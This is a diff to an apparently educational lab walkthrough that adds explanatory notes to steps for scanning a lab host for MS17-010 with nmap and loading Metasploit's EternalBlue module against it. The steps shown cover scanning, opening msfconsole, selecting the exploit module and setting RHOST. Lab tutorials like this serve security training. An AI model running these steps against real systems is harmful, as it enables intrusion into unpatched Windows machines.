@@ -46,12 +46,14 @@ nmap -p 445 192.168.100.10 --script smb-vuln-ms17-010
 ```bash
 msfconsole
 ```
+   * This may take several seconds to initialize, wait for the prompt. `msfconsole` is a command console used for running exploits against and dropping payloads on vulnerable targets, as well as many other uses (such as vulnerability discovery and auxilary scanning, but we won't get into those here).
 
 5. Once you are at the msfconsole command prompt, select the metasploit module for eternal blue (msfconsole supports tab-complete).
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 ```
+   * This instructs metasploit to use the ETERNALBLUE exploit against our vulnerable target
 
 6. Review your options for this module.
 
@@ -59,7 +61,7 @@ use exploit/windows/smb/ms17_010_eternalblue
 show options
 ```
 
-7. Notice that the RHOST option is required. This is the IP address of the host to be attacked.
+7. Notice that the RHOST option is required. This is the IP address of the host to be attacked. We set this value to the target IP address like so:
 
 ```bash
 set RHOST 192.168.100.10
